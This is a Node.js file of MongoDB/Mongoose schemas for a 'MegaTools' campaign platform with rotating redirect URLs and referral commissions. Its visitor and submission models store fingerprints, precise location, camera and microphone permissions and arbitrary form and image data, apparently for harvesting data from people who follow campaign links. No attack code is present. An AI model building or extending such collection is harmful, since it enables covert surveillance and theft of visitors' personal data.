// ============================================
// 🗄️ MEGATOOLS DATABASE MODELS
// File 2/5: All MongoDB Models
// ============================================

const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');

// ============================================
// 👤 USER MODEL (Complete)
// ============================================
const userSchema = new mongoose.Schema({
    // Core Identity
    masterId: { type: String, required: true, unique: true, index: true },
    username: { type: String, required: true, unique: true, trim: true },
    email: { type: String, required: true, unique: true, lowercase: true },
    password: { type: String, required: true },
    
    // Profile Information
    profile: {
        fullName: { type: String, default: '' },
        phone: { type: String, default: '' },
        avatar: { type: String, default: '' },
        facebook: { type: String, default: '' },
        telegram: { type: String, default: '' },
        whatsapp: { type: String, default: '' },
        country: { type: String, default: '' },
        timezone: { type: String, default: 'Asia/Dhaka' }
    },
    
    // Role & Permissions
    role: { 
        type: String, 
        enum: ['super_admin', 'admin', 'moderator', 'user'], 
        default: 'user' 
    },
    permissions: [{
        type: String,
        enum: ['manage_users', 'manage_campaigns', 'view_reports', 'manage_settings']
    }],
    
    // Account Status
    status: { 
        type: String, 
        enum: ['pending', 'active', 'suspended', 'banned'], 
        default: 'pending' 
    },
    
    // Referral System
    referral: {
        code: { type: String, unique: true, sparse: true },
        referredBy: { type: String, ref: 'User' },
        referredUsers: [{ type: String, ref: 'User' }],
        earnings: { type: Number, default: 0 },
        level: { type: Number, default: 1 }
    },
    
    // Approval System
    approval: {
        required: { type: Boolean, default: true },
        approvedBy: { type: String, ref: 'User' },
        approvedAt: { type: Date },
        notes: { type: String }
    },
    
    // API Access
    apiKey: { type: String, unique: true, sparse: true },
    apiCalls: { type: Number, default: 0 },
    
    // Security
    twoFactorEnabled: { type: Boolean, default: false },
    twoFactorSecret: { type: String },
    loginAttempts: { type: Number, default: 0 },
    lockUntil: { type: Date },
    
    // Statistics
    stats: {
        totalCampaigns: { type: Number, default: 0 },
        totalVisitors: { type: Number, default: 0 },
        totalClicks: { type: Number, default: 0 },
        conversionRate: { type: Number, default: 0 }
    },
    
    // Settings
    settings: {
        notifications: {
            email: { type: Boolean, default: true },
            push: { type: Boolean, default: true },
            sms: { type: Boolean, default: false }
        },
        theme: { type: String, default: 'light' },
        language: { type: String, default: 'bn' }
    },
    
    // Timestamps
    lastLogin: { type: Date },
    lastActive: { type: Date },
    createdAt: { type: Date, default: Date.now },
    updatedAt: { type: Date, default: Date.now }
}, { timestamps: true });

// Hash password before save
userSchema.pre('save', async function(next) {
    if (!this.isModified('password')) return next();
    this.password = await bcrypt.hash(this.password, 12);
    next();
});

// Compare password method
userSchema.methods.comparePassword = async function(candidatePassword) {
    return await bcrypt.compare(candidatePassword, this.password);
};

// Generate API Key
userSchema.methods.generateApiKey = function() {
    this.apiKey = 'mk_' + require('crypto').randomBytes(24).toString('hex');
    return this.apiKey;
};

// ============================================
// 📢 CAMPAIGN MODEL
// ============================================
const campaignSchema = new mongoose.Schema({
    campaignId: { type: String, required: true, unique: true },
    name: { type: String, required: true },
    ownerMasterId: { type: String, required: true, ref: 'User', index: true },
    
    // Campaign URLs
    urls: {
        entry: { type: String, required: true },
        quick: { type: String },
        switch: { type: String },
        more: { type: String },
        password: { type: String },
        fallback: { type: String }
    },
    
    // Current Active URL
    currentUrl: { type: String, required: true },
    
    // Rotation Settings
    rotation: {
        type: { type: String, enum: ['manual', 'auto', 'random', 'weighted'], default: 'manual' },
        interval: { type: Number, default: 3600 },
        lastRotated: { type: Date },
        weights: { type: Map, of: Number }
    },
    
    // Targeting
    targeting: {
        countries: [{ type: String }],
        devices: [{ type: String, enum: ['mobile', 'desktop', 'tablet'] }],
        browsers: [{ type: String }],
        languages: [{ type: String }]
    },
    
    // Statistics
    stats: {
        visitors: { type: Number, default: 0 },
        clicks: { type: Number, default: 0 },
        conversions: { type: Number, default: 0 },
        revenue: { type: Number, default: 0 }
    },
    
    status: { type: String, enum: ['active', 'paused', 'completed'], default: 'active' },
    createdAt: { type: Date, default: Date.now },
    updatedAt: { type: Date, default: Date.now }
});

// ============================================
// 👥 VISITOR MODEL
// ============================================
const visitorSchema = new mongoose.Schema({
    sessionId: { type: String, required: true, unique: true, index: true },
    masterId: { type: String, required: true, index: true },
    campaignId: { type: String, ref: 'Campaign' },
    
    // Auto Data (50+ fields)
    auto: {
        ip: String,
        userAgent: String,
        platform: String,
        language: String,
        languages: [String],
        screenWidth: Number,
        screenHeight: Number,
        colorDepth: Number,
        devicePixelRatio: Number,
        hardwareConcurrency: Number,
        deviceMemory: Number,
        maxTouchPoints: Number,
        timezone: String,
        timezoneOffset: Number,
        connectionType: String,
        downlink: Number,
        rtt: Number,
        referrer: String,
        isMobile: Boolean,
        isTablet: Boolean,
        isTouch: Boolean,
        geo: {
            country: String,
            region: String,
            city: String,
            latitude: Number,
            longitude: Number,
            isp: String
        },
        canvasFp: String,
        webglVendor: String,
        webglRenderer: String
    },
    
    // Permission Data
    permissions: {
        location: {
            lat: Number,
            lng: Number,
            accuracy: Number,
            timestamp: Date
        },
        camera: Boolean,
        microphone: Boolean,
        notification: Boolean
    },
    
    // Form Submissions
    submissions: [{
        type: { type: String, enum: ['form', 'image', 'file'] },
        data: mongoose.Schema.Types.Mixed,
        timestamp: Date
    }],
    
    // Redirect History
    redirects: [{
        from: String,
        to: String,
        type: { type: String, enum: ['entry', 'quick', 'switch', 'more', 'password'] },
        timestamp: Date
    }],
    
    currentPage: String,
    entryPage: String,
    status: { type: String, enum: ['active', 'inactive', 'exited'], default: 'active' },
    
    firstSeen: { type: Date, default: Date.now },
    lastSeen: { type: Date, default: Date.now },
    timeSpent: { type: Number, default: 0 }
});

// ============================================
// 🔗 REFERRAL MODEL
// ============================================
const referralSchema = new mongoose.Schema({
    code: { type: String, required: true, unique: true },
    ownerMasterId: { type: String, required: true, ref: 'User' },
    
    // Referral Settings
    type: { type: String, enum: ['admin_to_moderator', 'moderator_to_user'] },
    maxUses: { type: Number, default: 10 },
    uses: { type: Number, default: 0 },
    
    // Referred Users
    referredUsers: [{ type: String, ref: 'User' }],
    
    // Commission
    commission: {
        rate: { type: Number, default: 10 },
        total: { type: Number, default: 0 }
    },
    
    status: { type: String, enum: ['active', 'expired'], default: 'active' },
    expiresAt: { type: Date },
    createdAt: { type: Date, default: Date.now }
});

// ============================================
// 📝 SUBMISSION MODEL
// ============================================
const submissionSchema = new mongoose.Schema({
    submissionId: { type: String, required: true, unique: true },
    sessionId: { type: String, required: true, ref: 'Visitor' },
    
    type: { type: String, enum: ['auto', 'permission', 'form', 'image', 'advance'] },
    data: mongoose.Schema.Types.Mixed,
    
    metadata: {
        ip: String,
        userAgent: String,
        timestamp: Date
    },
    
    createdAt: { type: Date, default: Date.now }
});

// ============================================
// 📊 LOG MODEL
// ============================================
const logSchema = new mongoose.Schema({
    level: { type: String, enum: ['info', 'warn', 'error', 'debug'] },
    action: String,
    userId: String,
    ip: String,
    userAgent: String,
    data: mongoose.Schema.Types.Mixed,
    timestamp: { type: Date, default: Date.now }
});

// ============================================
// ⚙️ SETTINGS MODEL
// ============================================
const settingsSchema = new mongoose.Schema({
    key: { type: String, required: true, unique: true },
    value: mongoose.Schema.Types.Mixed,
    type: { type: String, enum: ['system', 'user', 'campaign'] },
    description: String,
    updatedBy: String,
    updatedAt: { type: Date, default: Date.now }
});

// ============================================
// 📤 EXPORT ALL MODELS
// ============================================
module.exports = {
    User: mongoose.model('User', userSchema),
    Campaign: mongoose.model('Campaign', campaignSchema),
    Visitor: mongoose.model('Visitor', visitorSchema),
    Referral: mongoose.model('Referral', referralSchema),
    Submission: mongoose.model('Submission', submissionSchema),
    Log: mongoose.model('Log', logSchema),
    Settings: mongoose.model('Settings', settingsSchema)
};